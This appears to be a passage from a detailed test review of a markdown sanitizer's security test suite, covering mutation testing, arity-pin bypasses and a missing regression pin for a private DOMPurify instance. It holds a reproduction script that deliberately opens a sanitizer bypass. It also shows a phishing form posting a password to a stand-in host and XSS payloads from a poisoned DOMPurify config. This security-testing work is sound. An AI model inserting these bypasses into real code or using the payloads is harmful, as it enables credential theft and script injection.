# test-195-r8 — independent TEST REVIEW of #195 round 8

**Tree** `/workspace`, branch `markdown-sanitize-r8`, HEAD
`3f6a695ed450718316b50303975621bbb725e4f8`, base `7b4f6dd`. Verified before any
work. `npm ci` exit 0.

**Gates, re-run at the end of the leg, exit codes from the child:**
`npm test` → 0, `markdown sanitizer: 78 checks passed (123 assertions)` ·
`npx tsc --noEmit` → 0 · `npm run build` → 0. `git status --porcelain` empty.

**Prediction files, written before the corresponding measurements:**
`reports/test-195-r8-evidence/predictions-01-totals.md` (before any test/build
run) · `reports/test-195-r8-evidence/predictions-02-mutations.md` (before the
probe, any mutation, and the ablation).

---

## Verdict

**Round 8's test work is genuine and it is not inert** — 48 scored mutations, 45
landed exactly as predicted, and every rule I neutered that the file claims is
fixtured went red for the reason the file says it would. B2's positive control is
sound on all three of §3's criteria. The post-hoc tally sub-form is absent again.

**But the round did not close the class it opened, and it left its own headline
production change unpinned.** Two blockers:

- **T-1 — a LIVE arity-pin bypass at HEAD, same class as C7-l, in TWO shapes.**
  `stripInertText` deliberately preserves template literals; a `)` or a `(` inside
  a template-literal *type* in the parameter list defeats
  `balancedDeclarationParameterLists`. Measured against real `markdown.ts` with a
  real, usable second parameter that turns `FORBID_TAGS`/`FORBID_ATTR` off:
  **GREEN 78 checks / 123 assertions, `tsc --noEmit` 0, `npm run build` 0**, and
  the credential-phishing form named in the first paragraph of `markdown.ts` comes
  back through the second argument.
- **T-2 — B3a, the round's headline production change (a private DOMPurify
  instance), has NO regression pin.** Reverting it to the process-global singleton
  is **GREEN 78/123 with `tsc` 0**, and the reverted tree reproduces
  `markdown.ts:99-103`'s own quoted `alert(1)` measurement verbatim. Round 7 gave
  the identical `marked` fix a by-effect pin; round 8 did not give DOMPurify one.
  The asymmetry `markdown.ts:86-89` says "is no longer accepted" has moved from
  production into the test suite.

Plus one masking pair of exactly the shape the brief asked me to hunt (**T-3**),
three silently-emptyable fixture tables (**T-4**), and two sentences written *this
round* that are measurably false (**T-5**, **T-6**), one of them in the docblock of
the very function that fixed the previous false sentence.

**Recommend: do not merge until T-1 and T-2 are closed.** T-1 is a live bypass of
a security property the file spends 70 lines justifying; T-2 makes the round's
main production fix silently revertible.

---

## 1. The five pinned totals — recomputed from a static read

Derivations are in full in `predictions-01-totals.md`, written before `npm test`
was ever run on this tree. Summary:

| constant | predicted (static) | measured | derivation |
|---|---|---|---|
| `EXPECTED_CHECK_CALL_SITES` | **77** | 77 | literal count of `check(` call sites; 10 other occurrences of `check(` are the definition at L50 or prose. Attributed by enclosing function: formControls 9, spoofingAttributes 5, scriptExecution 12, svgSurface 12, ordinaryMarkdown 10, inputContract 3, taskLists 3, sinkBinding 20, dependencyPolicy 2, sharedMarkedSingleton 1 = 77. All ten invoked unconditionally from `run()`. 76 sites at indent 2, one at indent 4 (L2673, inside `for (const rel of REQUIRED_SINKS)`). No `check(` inside a conditional. |
| `EXPECTED_CHECKS` | **78** | 78 | `77 + (REQUIRED_SINKS.length − 1)`; the one looping call site emits 2. |
| `EXPECTED_ASSERTIONS` | **123** | 123 | 115 static `assert*` call sites below L111. +4 for L498/L499 inside `assertSvgStyleStripped`, called from three checks (2×3 = 6). +4 for L711 inside `for (const bad of [undefined, null, 42, {}, []])` (1×5 = 5). The L669/L679 arity loops contain no `assert*`; the 20 `sinkBinding` and 2 `dependencyPolicy` checks throw directly. 115+4+4 = 123. |
| `EXPECTED_SOURCE_FILES` | **51** | 51 | recursive walk of `web/src`, minus `/\.test\.[cm]?[jt]sx?$/` and `INERT_EXTENSIONS` → 50 kept, 4 excluded (`src/gen/farmtable.json`, `src/styles/theme.css`, `src/util/markdown.test.ts`, `src/utils/task-ready.test.ts`); plus `EXTRA_SCANNED_FILES = ['index.html']` → 51. |
| `EXPECTED_REQUIRED_SINKS` | **2** | 2 | literal length of `REQUIRED_SINKS`; both paths exist on disk and appear in the scannable set. |

**All five match. The post-hoc tally sub-form is ABSENT on this tree**, replicating
round 7's clean negative. The one point worth stating: `EXPECTED_ASSERTIONS` is
the only one of the five whose static derivation is non-trivial (three
multiplicity corrections), and it is the one that G2 below shows is genuinely
load-bearing.

---

## 2. `balancedDeclarationParameterLists` — the §2 target

### 2a. Quoting probe

The five arity functions (`stripInertText`, `splitTopLevelParameters`,
`balancedDeclarationParameterLists`, `renderMarkdownArityViolation`,
`hasTopLevelDefault`) were extracted **verbatim by anchor** (`function X(` → next
`\n}\n`, so they cannot drift from the file) and compiled with the project's own
`node_modules/.bin/tsc`. 17 cases, all predicted in `predictions-02` before running.

| # | case | predicted | actual |
|---|---|---|---|
| P1 | sound declaration | null | null ✔ |
| P2 | `md: string \| ')'` + defaulted opts (STRING literal type) | caught | caught, 2 params ✔ |
| **P3** | ``md: string \| `)` `` + defaulted opts (TEMPLATE literal type) | **NOT caught** | **NOT caught** ✔ |
| P4 | `opts = { re: /\)/ }` (regex literal) | caught | caught ✔ |
| P5 | `// )` line comment in the list | caught | caught ✔ |
| P6 | `/* ) */` block comment in the list | caught | caught ✔ |
| P7 | ``opts = { s: `)` }`` (template in a DEFAULT) | caught | caught ✔ |
| P8 | C7-l verbatim (regression) | caught | caught ✔ |
| **P9** | ``md: `(` , ...rest`` (unbalanced `(` in a template) | caught | **NOT caught — PREDICTION WRONG** |
| P10 | space before the paren | caught | caught ✔ |
| P11 | ``md: string \| `x` `` (template, no 2nd param) | null | null ✔ |
| P12 | ``md: string \| `)` `` + rest | not caught | not caught ✔ |
| **P13** | ``md: string \| `(` `` + defaulted opts | (follow-up) | **NOT caught** |
| **P14** | ``md: string \| `(` `` + NON-defaulted 2nd param | (follow-up) | **NOT caught** |
| P15 | P3 shape with a THIRD parameter | (follow-up) | not caught |
| P16 | unbalanced `(` in a REGEX literal (control) | (follow-up) | caught — regex bodies *are* blanked |
| P17 | ``md: Array<`)`>`` + defaulted opts | (follow-up) | not caught |

P9 is the miss that mattered. I predicted the unterminated fallback would fail
safe; it does not, and following it produced the second bypass shape.

### 2b. T-1 — the live bypass, two shapes, measured against real `markdown.ts`

Mechanism: `stripInertText` blanks line comments, block comments, string
*contents* and regex-literal *bodies*, but **deliberately preserves template
literals** ("`html`…`` bodies are live code in this codebase"). A TypeScript
*template-literal type* is a template literal in the parameter list.

- **Shape 1, TRUNCATE.** A `)` inside the template closes the depth counter
  early; everything after it — including the whole second parameter — is invisible.
- **Shape 2, SWALLOW.** A `(` inside the template leaves the list unterminated;
  `balancedDeclarationParameterLists` returns the entire file tail as one string;
  `splitTopLevelParameters` then sees no top-level comma (depth never returns to 0)
  and reports **exactly one parameter**. It passes.

Both applied to the real `web/src/util/markdown.ts`, with a body that makes the
second parameter genuinely usable:

```ts
export function renderMarkdown(md: string | `x)y`, opts: { inline?: boolean } = {}): string {
  if (typeof md !== 'string') return '';
  return purifier.sanitize(parser.parse(md) as string, {
    FORBID_TAGS: opts.inline ? [] : FORBID_TAGS,
    FORBID_ATTR: opts.inline ? [] : FORBID_ATTR,
  });
}
```

| id | mutation of `markdown.ts` | predicted | actual |
|---|---|---|---|
| D1 | shape 1, `` `x)y` `` + defaulted opts | GREEN 78/123, tsc 0 | **GREEN 78/123, tsc 0** ✔ |
| D2 | one-token control: `` `x)y` `` → `'x)y'` | RED | RED — `renderMarkdown declares 2 parameters` ✔ |
| D3 | one-token control: union term deleted | RED | RED — same check ✔ |
| D4 | shape 2, `` `x(y` `` + defaulted opts | (follow-up) | **GREEN 78/123, tsc 0** |
| D5 | shape 2 with a non-`{}` default | (follow-up) | **GREEN 78/123, tsc 0** |
| D6 | one-token control: `` `x(y` `` → `'x(y'` | (follow-up) | RED ✔ |

D2/D3/D6 are the attribution: **the backtick is the whole exploit.**

`npm run build` on D1: **exit 0**. And the channel is real — the mutation was
verified to actually weaken the thing, per the standing bar:

```
DEFAULT :
inline  : <form action="https://evil.example"><input name="p" type="password"></form>
```

That is the credential-phishing form `markdown.ts:4-11` opens by naming, returned
through a second argument, with all three gates green.

**Reproduction** (content-addressed; anchor is the whole `renderMarkdown` block,
verified unique):

```bash
cd /workspace/web && npm ci
python3 - <<'EOF'
p='src/util/markdown.ts'; s=open(p).read()
A="""export function renderMarkdown(md: string): string {
  if (typeof md !== 'string') return '';
  return purifier.sanitize(parser.parse(md) as string, {
    FORBID_TAGS,
    FORBID_ATTR,
  });
}"""
assert s.count(A)==1
open(p,'w').write(s.replace(A,"""export function renderMarkdown(md: string | `x)y`, opts: { inline?: boolean } = {}): string {
  if (typeof md !== 'string') return '';
  return purifier.sanitize(parser.parse(md) as string, {
    FORBID_TAGS: opts.inline ? [] : FORBID_TAGS,
    FORBID_ATTR: opts.inline ? [] : FORBID_ATTR,
  });
}"""))
EOF
npm test; echo "test=$?"        # 0, "78 checks passed (123 assertions)"
npx tsc --noEmit; echo "tsc=$?" # 0
npm run build; echo "build=$?"  # 0
git checkout -- src/util/markdown.ts
```

Root cause: `renderMarkdownArityViolation` scans a view in which exactly one
construct that can contain an unbalanced or premature paren survives, and that
construct is legal in a type position. Neither `ARITY_EVASIONS` nor
`ARITY_LEGITIMATE` contains a single backtick. Fixing it is a tokenizer change in
`stripInertText` (a *type-position* template must be blanked, unlike a
`html`-tagged value-position one) or a paren-aware pre-pass; I have deliberately
not written the fix.

**Shape 2 also falsifies a sentence written this round — see T-5.**

### 2c. Mutation table for the target itself

| id | mutation | predicted | actual |
|---|---|---|---|
| A1 | revert to the pre-round-8 `[^)]*` regex | RED, exactly `SURVIVED: C7-l` + `SURVIVED: C7-m`, nothing else | **exact** ✔ (the leg's claim reproduced) |
| A2 | one token: delete `if (c === '(') depth += 1;` | RED, same two survivors | **exact** ✔ |
| A3 | delete `else if (c === ')') depth -= 1;` | RED via *both* the real-file check and the fixture | RED via the **fixture only** (`SURVIVED: C7-e2` + `FALSE POSITIVE: prettier's trailing comma`) — **direction right, named reason WRONG** |
| A4 | stop after the first declaration | RED via `SURVIVED: C7-e2` | **exact** ✔ |
| A5 | drop `\s*` from the declaration regex | GREEN, but fail-safe | GREEN ✔; probe P10 confirms the mutant returns *"could not find a declaration"* rather than passing — **a green mutation that did not weaken the guard** |
| A6 | delete `re.lastIndex = i;` | GREEN, semantically inert | GREEN ✔; inert (no input can nest a second `export function renderMarkdown(` inside the first list) |
| A7 | unterminated fallback `code.length` → `i` | GREEN, exact no-op | GREEN ✔; when unterminated `i === code.length`, so it is literally a no-op |
| B1 | make the UNTERMINATED branch silently skip | GREEN | GREEN ✔ — see T-5 |
| C1 | arity view `{strings:true}` → `{strings:false}` | GREEN → finding | GREEN ✔ — see T-3 |
| C2 | arity view → raw `src` | RED via `FALSE POSITIVE: a comment inside the parameter list` | **exact** ✔ |
| C3 | `hasTopLevelDefault`: drop the `=>` guard | RED via the two function-typed sole-parameter false positives | **exact** ✔ — round 8's B-fix is genuinely reachable |
| C4 | `splitTopLevelParameters`: drop `<`/`>` from depth | RED via `FALSE POSITIVE: a comma inside a type argument` | **exact** ✔ |

A5/A6/A7 are the three mutations "nothing catches", and all three are harmless —
I verified each rather than reporting the green as a hole. **B1 and C1 are the two
green mutations that are NOT harmless.**

### 2d. The `.length === 1` ablation, reproduced independently

Ablation, applied as five content-addressed edits: `return null` inserted as the
first statement of `renderMarkdownArityViolation`; `ARITY_EVASIONS` and
`ARITY_LEGITIMATE` emptied; both `fixtureTableViolation` expectations set to 0.

**F0, the ablation's own positive control** (ablation applied, `markdown.ts`
untouched): **GREEN 78/123**. The ablation isolates.

Ground truth from a direct read-back of all 13 spellings, compiled with the
project's tsc (independent of the suite):

```
C7-a 1  C7-b 1  C7-c 1  C7-d 2  C7-e2 1  C7-g 1  C7-h 1
C7-i 1  C7-j 0  C7-f 1  C7-k 0  C7-l 1  C7-m 1
```

Three drive `.length` off 1 — C7-d (UP), C7-j (DOWN), C7-k (DOWN). That confirms
`markdown.ts:168-178` and `markdown.test.ts:629-637` in substance.

Full ablation, each spelling applied to the real `markdown.ts`:

| spelling | predicted | actual |
|---|---|---|
| C7-a, C7-b, C7-c, C7-e2, C7-g, C7-h, C7-f, C7-l | GREEN (survive) | **GREEN — all 8** ✔ |
| **C7-d** `opts?: T` | RED via `.length` | **RED, sole failing check is `.length`** ✔ |
| **C7-k** `md: string = ''` | RED via `.length` | **RED, sole failing check is `.length`** ✔ |
| C7-j `...md: string[]` | RED via `.length` | RED — but **23** checks fail; `.length` is one of them, the other 22 are behavioural (the function returns `''` for everything). Not unique coverage. **Prediction partially wrong.** |
| C7-i destructured sole param | GREEN | **RED via `tsc`** (call sites break) — not a detection by the suite |
| C7-m function-typed first param | GREEN | **RED via `tsc`** — not a detection by the suite |

**Answer to the brief's question: `.length === 1` does NOT have zero unique
coverage. It has unique coverage for TWO spellings, C7-d and C7-k — not one.**
That makes `markdown.test.ts:643-644` false; see **T-6**. The narrower sentence in
`markdown.ts:186-189` ("`opts?: T` is caught by `.length === 1` and by nothing
else") is **true as written**; it is the brief's paraphrase and the test file's
stronger restatement that are wrong.

---

## 3. B2's positive control for `fixtureTableViolation` — §3

| id | mutation | predicted | actual |
|---|---|---|---|
| E1 | neuter `fixtureTableViolation` to always return null | RED, **exactly one** check, naming all three directions | **exact** ✔ — only `fixture: the table-size pin fires on a changed table length`, reporting SHORTENED, EMPTIED and LENGTHENED |
| E2 | E1 + `ARITY_EVASIONS` emptied on top | RED, still only B2's control | **exact** ✔ (the pre-round-8 "GREEN with a table emptied" measurement, now red) |
| E3 | `===` → `>=` (a floor, not a pin) | RED via LENGTHENED only | **exact** ✔ |
| E4 | compare the table to itself | RED via all three directions | **exact** ✔ |
| E5 | `ARITY_EVASIONS` emptied ALONE, no neutering | (control) | RED via `ARITY_EVASIONS has 0 entries, expected 13` — the pin itself works |

**§3(a) yes** — E1/E4 redden it. **§3(b) yes** — the reason named is exactly the
property under test, one message per direction, and the "rejects a table of the
expected length" arm stays silent (so it is not reddening indiscriminately).
**§3(c) yes** — the baseline is green at 78/123, and E5 shows the control does not
fire when the *tables* change, only when the *function* changes. It is scoped to
the predicate, which is what a level-out control should be.

The residue the file already states honestly (`markdown.test.ts:3220-3223`) holds:
it catches a NEUTERED predicate, not a DELETED call site. **B2 is sound. No
finding.**

---

## 4. Pairs of defects that mask each other — the highest-value ask

### T-3 (Medium) — `strings:true` ↔ `decls.length !== 1`

`renderMarkdownArityViolation` has two independent guards over the same property:
string blanking in its view, and the "exactly one declaration" rule. The only
fixture that exercises string blanking is **C7-h, "a string literal quoting the old
signature"** — and C7-h is *not reachable* through the multi-declaration rule.

| id | mutation | actual |
|---|---|---|
| C1 | `{strings:true}` → `{strings:false}` **alone** | **GREEN 78/123** |
| M2 | remove the `decls.length !== 1` rule **alone** | RED — `SURVIVED: C7-e2` only |
| M3 | **both** | RED — `SURVIVED: C7-e2` **and `SURVIVED: C7-h`** |

Read it the way the brief asks: with string blanking removed, C7-h's string
literal becomes a *second* visible declaration, so `decls.length !== 1` catches it
and the fixture stays green. Each defect hides the other's fixture. Consequence
today: **the string-blanking half of the arity scan has zero unique fixture
coverage**, and D2/D6 above show it is exactly the half that catches the quoted
form of the live bypass. Someone "simplifying" `{strings:true}` to `{strings:false}`
sees a green suite and re-opens `md: string | 'x)y'` as a third bypass shape.

Fix shape: add an `ARITY_EVASIONS` entry whose old-signature string literal appears
where it cannot be read as a second declaration (e.g. inside the parameter list, or
a single quoted `)` in a type), so that the string-blanking half is scored on its
own. That fixture is also the natural home for the T-1 backtick cases.

### T-4 (Medium) — three fixture tables `fixtureTableViolation` does not guard

`fixtureTableViolation` guards **13** named tables. `fixture: sanitizer ownership
holds against every route to the singleton` opens with
`fixtureTableViolation('OWNERSHIP_EVASIONS', OWNERSHIP_EVASIONS, 10)` — and then
loops over **three inline arrays holding nine more fixtures that nothing guards**.

| id | mutation | predicted | actual |
|---|---|---|---|
| G1 | empty the inline `clean` array (4 false-positive controls) | GREEN | **GREEN 78/123** ✔ |
| G1b | empty the inline `laundered` array (3 R9 positives) | GREEN | **GREEN 78/123** ✔ |
| G1c | empty the inline `asset` array (2 inert-asset controls) | GREEN | **GREEN 78/123** ✔ |
| G2 | CONTRAST: empty the inline `bad` array in `inputContract` | RED via the assertion total | **RED — `expected 123 assertions to run, 118 did`** ✔ |

G2 is the contrast that makes G1 a finding rather than an observation: an inline
table whose loop body runs `assert*` **is** covered, by `EXPECTED_ASSERTIONS`.
The three in the ownership check push onto a `missed` array instead, so emptying
them changes neither the check total nor the assertion total. This is the
identical shape `fixtureTableViolation` was written to prevent, one scope inward:
the guarded table sits at the top of the same check and makes the block look
pinned. A census of the whole file found **exactly these three** (the other
`for (const … of [` sites at L700, L2149 and L3124 are covered by the assertion
total, are production logic, or are not fixture tables).

Cheapest fix: hoist the three arrays to named consts and add three
`fixtureTableViolation` calls, taking the guarded count from 13 to 16.

### T-2 (Blocker) — B3a is unpinned

`markdown.ts:71-76` records that the `marked` privacy property got a by-effect pin
in round 7 precisely because a name-based rule cannot own a global. B3a made
DOMPurify private for the same reason and **shipped no equivalent pin**. No test in
the file references `purifier` or `createDOMPurify`.

| id | mutation | predicted | actual |
|---|---|---|---|
| J1 | `import createDOMPurify from 'dompurify'` + `createDOMPurify(window)` → the default export used directly | (found during the "one guard nobody guards" sweep) | **GREEN 78/123, `tsc --noEmit` 0** |

Verified to actually weaken the thing — the same measurement `markdown.ts:99-103`
quotes as its justification:

```
HEAD (private createDOMPurify(window)):
  baseline : "<p><img src=\"x\"></p>\n"
  poisoned : "<p><img src=\"x\"></p>\n"
J1 (process-global singleton):
  baseline : "<p><img src=\"x\"></p>\n"
  poisoned : "<p><img src=\"x\" onerror=\"alert(1)\"><script>alert(2)</script></p>\n"
```

(`poisoned` = after `DOMPurify.setConfig({ ADD_TAGS: ['script'], ADD_ATTR: ['onerror'] })`
from an unrelated module.) R8/R9 cannot catch the revert because
`SANITIZER_OWNER` — `markdown.ts` itself — is exempt by construction, which is
correct for R8 and is exactly why an ownership rule cannot be the pin here.

Fix shape: the mirror of `renderMarkdown does not use the shared marked singleton`
— poison the DOMPurify singleton with `setConfig`, prove the poisoning took
(inline positive control), assert `renderMarkdown`'s output is unaffected, and run
it LAST like `sharedMarkedSingleton()` since `setConfig` has no clean undo. That
is +1 check and +2/3 assertions, so `EXPECTED_CHECK_CALL_SITES` and
`EXPECTED_ASSERTIONS` move in the same commit.

---

## 5. Sentences written this round that are measurably false

### T-5 (Medium) — `markdown.test.ts:1696-1698`

> *"An UNTERMINATED list is not silently skipped — it is returned as-is, so
> `splitTopLevelParameters` sees the whole tail and the caller reports something
> rather than passing."*

**False.** Returning the whole tail does not make the caller report: the tail
contains unbalanced `(`, so `splitTopLevelParameters` never returns to depth 0,
finds no top-level comma, and reports **one** parameter. Measured at P13/P14 and
live at D4/D5. An unterminated list is *exactly* a silent pass, and it is the
second half of T-1.

It is also unfixtured: **B1** (make the unterminated branch push nothing at all) is
**GREEN 78/123** — no input in the suite reaches that branch. This sentence was
written in `4b430c6`, the commit whose message is *"correct two false rationales"*,
in the docblock of the function that fixed the previous false rationale. That is
the failure mode the brief warned about, landed.

### T-6 (Medium) — `markdown.test.ts:643-644`

> *"… `opts?: T` is caught here and nowhere else, while `opts = {}` under the same
> ablation stays green. So it is a backstop for exactly the UP direction, plus
> source/artifact divergence."*

**"exactly the UP direction" is false.** Under the identical ablation, **C7-k
(`md: string = ''`, the DOWN direction) is also caught by `.length === 1` and by
nothing else** — it is the sole failing check, and behaviour is unchanged so
nothing else can see it. The assertion is a backstop for the UP direction *and* for
the defaulted-sole-parameter DOWN case. The corrected sentence is strictly stronger
than the one written, so this is a case of under-claiming — but it is still a
measured-false sentence in a file whose whole discipline is that these get
measured, and `markdown.ts:186-189` states the same measurement correctly, so the
two files now disagree.

### T-7 (Low) — the four "eleven" sentences are wrong at HEAD

| location | text | true value at HEAD |
|---|---|---|
| `markdown.ts:176` | "all eleven ARITY_EVASIONS" | 13 |
| `markdown.test.ts:636` | "over all eleven ARITY_EVASIONS" | 13 |
| `markdown.test.ts:3205` | "All eleven fixture tables" | 13 |
| `markdown.test.ts:3217` | "all eleven arity bypasses" | 13 |

Provenance, measured per revision:

```
rev       named tables guarded   ARITY_EVASIONS
7b4f6dd            11                  11
4333278            13                  11    (B3b/B3c added the two DYNAMIC_IMPORT tables)
1e4ac81            13                  11    (B2 — wrote "All eleven fixture tables")
4b430c6            13                  13    (C7-l/C7-m added)
3f6a695            13                  13
```

So `markdown.test.ts:3205` was **false when written**: B2's own commit asserted
"eleven" about a set that its immediate predecessor had already taken to thirteen.
The other three were true when written and were made stale by `4b430c6`.
`fixtureTableViolation` itself would not catch this — it pins table *lengths*, not
the prose that counts *tables*.

**The brief repeats the error** (see §7).

### T-8 (Low) — `markdown.test.ts:2551-2554`

> *"The per-file R7 keeps its own narrower view (`code`, strings blanked, imports
> NOT stripped) … and this promoted copy does not replace it."*

The two views are **byte-identical**. Per-file R7 (L2265) runs
`matchLines(code, /\\[uxU]/)` where `code = stripInertText(src, { strings: true })`
(L2182). Tree-wide R7 (L2557) runs `matchLines(codeNoStrings, /\\[uxU]/)` where
`codeNoStrings = stripInertText(src, { strings: true })` (L2707). Same predicate,
same view, and the tree-wide set is a superset of the two sink files. "Narrower
view" is not why the per-file copy is kept.

Corroborated both ways:

| id | mutation | actual |
|---|---|---|
| I1 | tree-wide R7 view `codeNoStrings` → `code` | RED — false-positives on `markdown.ts`'s `'☑︎'`. The `strings: true` *rationale* is sound. |
| I2 | delete the per-file R7 block entirely | RED via `SINK_EVASIONS`: `V8 directive spelled with a unicode escape` + `V8b escape hidden inside a second import statement` — fixtured, but *not* by anything the tree-wide copy misses |

The correct justification is the one the file already gives two lines earlier for
R6b: *"a redundant rule is kept when it names the mistake precisely."* That is
true; "narrower view" is not.

### T-9 (Informational) — both promoted tree-wide tripwires are vacuous, and their call sites are unpinned

| id | mutation | predicted | actual |
|---|---|---|---|
| H0 | grep the scanned set for a live dynamic `import(` or a `\u`/`\x` outside a string | none of either | **none of either** ✔ (the two `import(` hits in `markdown.ts` are in comments, which are stripped) |
| H1 | neuter the tree-wide dynamic-import tripwire body to a no-op | GREEN | **GREEN 78/123** ✔ |
| H2 | neuter the tree-wide unicode/hex-escape tripwire body to a no-op | GREEN | **GREEN 78/123** ✔ |

Not a defect — the file states plainly that mechanism (b) is a tripwire and that
the fixtures carry the predicates (which C2/I2 confirm they do). Recorded because
it bounds what B3c's promotion actually buys: the *predicate* is pinned, the
tree-wide *call site* is not, and `EXPECTED_CHECKS` cannot tell an eviscerated
body from a live one (which `markdown.test.ts:3644` already says).

---

## 6. The two trust items from brief §4

**Item 2 — "round 6 landed three production changes, not four": CONFIRMED TRUE.**
`git diff 3b5312b fc2b947 -- web/` touches four files. `markdown.ts` has exactly
two code changes (`slot` appended to `FORBID_ATTR`; `if (typeof md !== 'string')
return '';`) — everything else in its +28/−1 is comment. `package.json`:
`"dompurify": "^3.0.0"` → `"^3.4.12"` (plus the lockfile). That is three.
`git show 86f30bc:web/src/util/markdown.ts | grep ALLOW_UNKNOWN\|PROTOCOL` returns
nothing, so the fourth claimed change, "URI policy pinned", is test-only. The r7
log is right and the r6 log entry is wrong.

**Item 1 — the "GREEN at 69 checks" figures: they DO have an anchor, and finding it
resolves a note the file left open.** Eleven such figures exist across the two
files. Measuring `check(` call sites at every revision that touched
`markdown.test.ts` from round 5 to HEAD:

```
fc2b947  68   round-6 head
538ce54  69   round 7, first commit   <-- the only revisions that ever measured 69
c98eb79  69   round 7, second commit
7e758b6  70 ...
```

So 69 is a real, reachable tree state — the round-7 leg's starting point — and the
docblocks are honest measurements of round-6 *defects* taken on an early round-7
*tree*. **Not a defect.** As a bonus it closes the item the file itself flags as
unreconciled at `markdown.test.ts:3618-3621`: "Moved 61 → 69 in round 6" should
read **61 → 68**; the 69 belongs to round 7's first two commits, not to round-6
head. That is a one-line docs fix with a measurement behind it.

---

## 7. WHERE THIS BRIEF IS WRONG

1. **"the single function guarding eleven fixture tables"** (§ *What round 8
   changed*, and again in §3: "`fixtureTableViolation` guards eleven fixture
   tables"). It guards **13** at HEAD, and it already guarded 13 when B2 was
   written. The brief inherited the error from `markdown.test.ts:3205`. This is the
   error I was told to expect, and it propagated from tree → log → brief without
   anyone recomputing it — which is the same failure mode as a post-hoc tally.

2. **"[the leg] found it uniquely catches `opts?: T` and nothing else"** (§2,
   authorship note). The ablation gives **two** uniquely-covered spellings, C7-d
   *and* C7-k. `markdown.ts:186-189` never claimed exclusivity across spellings —
   it says only that `opts?: T` is caught there and nowhere else, which is true.
   The brief's paraphrase over-reads it into a claim the tree does not make, and
   then §2 offers me a binary ("if `.length === 1` has no unique coverage at all…")
   in which the actual answer does not fit. The round-8 sentence *is* false, but
   because it claims **too little** coverage, not none.

3. **"Before this round, neutering it left the suite GREEN at 75/122"** (§3). The
   tree records **77/122** for that measurement, twice
   (`markdown.test.ts:2507` and `:3216`). 75/122 is a different measurement
   entirely — the `format.ts` dynamic-import bypass at `markdown.test.ts:1452` and
   `:2980`. Two separate figures have been conflated. It does not change the
   conclusion, but I could not have reproduced "75/122" and would have burned
   budget trying.

4. **§2's framing that `balancedDeclarationParameterLists` is "unpinned by anything
   except the fixtures it scores"** is right in spirit but understates the problem
   in one direction and overstates it in another. Understates: its *docblock* is
   also unpinned, and that is where the false sentence landed (T-5). Overstates:
   three of my seven mutations of it are green *and harmless* (A5/A6/A7), so
   "unpinned" is not by itself the finding — I had to verify each green rather than
   count it.

5. **Minor, in my favour:** the brief's `[MEASURED by me]` diffstat is exact —
   `markdown.ts` +79/−34, `markdown.test.ts` +514/−59, both confirmed by
   `git diff --numstat 7b4f6dd 3f6a695`. Recorded because the brief asks me to
   check its numbers and this one holds.

---

## 8. What I could NOT verify

- **Whether T-1's two shapes are exhaustive.** I found two constructs that survive
  `stripInertText` into the parameter list. I did not prove there is no third. The
  right fix is not a third fixture but making the *view* sound for type positions,
  and I did not attempt to characterise that.
- **Whether the T-1 spellings survive review by a human.** ``md: string | `x)y` ``
  is obviously odd. So was `md: string | ((x: string) => string)`, and it shipped
  as the round's own headline finding. I am reporting mechanism, not plausibility.
- **The dompurify 3.4.12 CVE/advisory attribution** — brief §4 assigns it to the
  security auditor; I did not touch it.
- **F-4 (the Vite plugin injecting into `dist/index.html`)** — known-open, audit
  leg's. I did not look, and I found no new instance of the category incidentally.
- **Whether `EXPECTED_CHECKS` catches a deleted `check()` in every position.** I
  reasoned it does (the total is pinned and derived from a hand-maintained call-site
  count) but did not mutate a deletion at each of the 77 sites; the file itself
  scopes this honestly at `markdown.test.ts:3644`.
- **Round-6 and earlier history beyond the `check(`-count measurement.** I measured
  counts per revision; I did not re-derive the round-6 legs' conclusions.
- **Whether `sharedMarkedSingleton()` running last is still safe** if a DOMPurify
  singleton pin is added next to it (both poison process globals with no undo).
  Flagged for whoever implements T-2's fix; not measured.
- **The three inline arrays in T-4 are the only unguarded fixture tables *in this
  file*.** I did not audit `src/utils/task-ready.test.ts`.

---

## 9. Void runs, in full

Per the standing bar. I had **no void run reach a reported number** — the harness
aborts on a green run it cannot parse a `N checks passed` line from, on 0 checks,
on a non-GREEN/non-78/123 baseline, on a non-unique anchor, and on a dirty tree
before or after. None of those aborts fired. But four runs produced no measurement,
and **one of them was a genuine void that printed a clean, confident, wrong number
and was caught only by the brief's stated detector** — a number contradicting
something visible. All are recorded.

1. **THE REAL ONE. My first `Function.length` read-back reported 5 spellings and
   looked perfect.** I parsed `ARITY_EVASIONS` out of the source with a regex over
   the object literals. It matched 5 of 13 entries (the multi-line `replace:` forms
   and the concatenated-string forms did not match), and then compiled, ran, and
   printed a tidy five-row table with `TSC=0`. Nothing in the output said anything
   was missing. **It was caught because it printed `PARSED 5` next to a pin that
   says 13** — the count contradicted something visible. Fix: stopped parsing and
   evaluated the real array (with `ARITY_DECL` in scope) through node, which
   returned `EVASIONS 13 LEGITIMATE 8`, matching the two `fixtureTableViolation`
   expectations. Every `.length` and ablation figure in this report is from the
   corrected extraction. Had I not printed the count, this report would have
   claimed the ablation over "all thirteen" spellings while having run five.

2. `npx tsc` resolved the unrelated npm package `tsc@2.0.4` ("This is not the tsc
   command you are looking for"). Non-zero exit, no measurement taken. Fixed by
   using `/workspace/web/node_modules/.bin/tsc` everywhere. (`npx tsc --noEmit` as
   a *gate* inside `web/` resolves correctly — the local binary wins there.)

3. Probe compile failures: `TS2688 Cannot find type definition file for 'node'`,
   then `TS2451 Cannot redeclare block-scoped variable 'console'`. Both hard
   errors, no measurement. Fixed by dropping `"types": ["node"]` and the redundant
   `declare const console`.

4. `git show $rev:web/src/util/markdown.test.ts` inside a bash `for` loop emitted
   `fatal: ambiguous argument 'b/src/util/markdown.test.ts'` for every revision —
   loud, no measurement. Re-ran the same measurement from Python with an explicit
   argv list.

5. The first end-to-end exploit demo failed with `ERR_MODULE_NOT_FOUND: jsdom` —
   the runner was in `/tmp`, outside `web/node_modules` resolution. Non-zero exit,
   no output claimed. Re-run from inside `web/`.

**Harness hygiene.** All mutations content-addressed; the harness counts anchor
occurrences and aborts unless exactly 1. Every run restores via
`git checkout -- src/util/markdown.test.ts src/util/markdown.ts` in a `finally`
and re-checks `git status --porcelain` afterwards, aborting if non-empty. Exit
codes are taken from the child `subprocess.run` return code, never through a pipe.
`npm ci`, not `npm install`. RED-via-`tsc` is reported as a separate outcome from
RED-via-the-suite and is never scored as a detection by the suite (this mattered
for C7-i and C7-m in the ablation). Both harness files were deleted at the end;
final `git status --porcelain` is empty.

---

## 10. Scorecard

**48 scored mutations + 17 probe cases.** 45/48 mutations and 16/17 probe cases
landed exactly as predicted; the three misses are recorded above (**A3** named
reason wrong, **C7-j** under ablation not uniquely covered, **P9** predicted
